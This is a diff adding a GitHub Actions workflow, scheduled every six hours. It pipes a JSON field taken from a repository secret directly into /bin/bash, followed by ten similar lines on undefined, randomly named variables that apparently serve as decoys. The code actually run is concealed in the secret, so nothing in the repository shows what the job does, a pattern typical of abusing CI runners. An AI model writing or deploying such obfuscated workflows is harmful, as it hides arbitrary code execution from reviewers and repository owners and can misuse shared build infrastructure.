@@ -1,0 +1,27 @@
+name: huangjiguangqijiguang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huangjiguangqijiguang
+        env:
+          dat266: ${{ secrets.dat266 }}
+        run: |
+          echo $dat266 | jq -r .bfd67 | /bin/bash
+          echo $acdcn5 | jq -r .zmfsg9926 | /bin/bash
+          echo $djhdf33 | jq -r .bb4863 | /bin/bash
+          echo $s81800 | jq -r .ocb490 | /bin/bash
+          echo $msvaz492 | jq -r .mz92546 | /bin/bash
+          echo $fybs3125 | jq -r .op41893 | /bin/bash
+          echo $ktwxq08587 | jq -r .bhruc693 | /bin/bash
+          echo $jylpe75029 | jq -r .dmzfu61878 | /bin/bash
+          echo $mdqir63 | jq -r .jq4548 | /bin/bash
+          echo $y1343 | jq -r .c78211 | /bin/bash
+          echo $esvz55 | jq -r .qj95789 | /bin/bash
+
